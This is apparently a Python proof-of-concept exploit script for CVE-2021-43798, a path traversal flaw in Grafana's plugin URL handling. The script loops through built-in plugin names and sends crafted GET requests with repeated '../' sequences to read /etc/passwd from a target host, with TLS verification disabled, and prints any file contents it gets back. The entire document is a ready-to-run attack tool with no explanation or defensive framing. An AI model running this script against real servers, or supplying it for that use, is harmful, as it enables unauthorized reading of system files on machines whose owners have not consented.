
#!/usr/bin/env python3

import sys
import argparse
import requests

plugins = [
	'mysql',
	'alertlist',
    	"annolist",
    	"barchart",
    	"bargauge",
    	"candlestick",
    	"cloudwatch",
    	"dashlist",
    	"elasticsearch",
    	"gauge",
    	"geomap",
    	"gettingstarted",
    	"grafana-azure-monitor-datasource",
    	"graph",
    	"heatmap",
    	"histogram",
    	"influxdb",
    	"jaeger",
    	"logs",
    	"loki",
    	"mssql",
    	"news",
    	"nodeGraph",
    	"opentsdb",
    	"piechart",
    	"pluginlist",
    	"postgres",
    	"prometheus",
    	"stackdriver",
    	"stat",
    	"state-timeline",
    	"status-histor",
    	"table",
    	"table-old",
    	"tempo",
    	"testdata",
    	"text",
    	"timeseries",
    	"welcome",
    	"zipkin"
]

headers = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
}

def exploit(args):
	s = requests.Session()
	host = args.target
	if len(host) <= 3:
		sys.exit(1)
	else:
		try:
			for plugin in plugins:
				class Url:
					url = host + '/public/plugins/' + plugin + '/../../../../../../../../../../../../../etc/passwd'			
				
				url=Url.url
				r = requests.Request(method='GET', 
url=url, headers=headers)
				prep = r.prepare()
				prep.url = url
				res = s.send(prep, verify=False, 
timeout=3)
				if res.status_code == 200:
					print(res.text)					
				else:
					return
		except Exception:
			return

def main():
	parser = argparse.ArgumentParser(description="PoC CVE 2021-43798")
	parser.add_argument("-H", "--host", dest="target", required=True, 
help="Target host")
	args = parser.parse_args()
	try:
		exploit(args)
	except KeyboardInterrupt:
		return

if __name__ == '__main__':
	main()
	sys.exit(0)

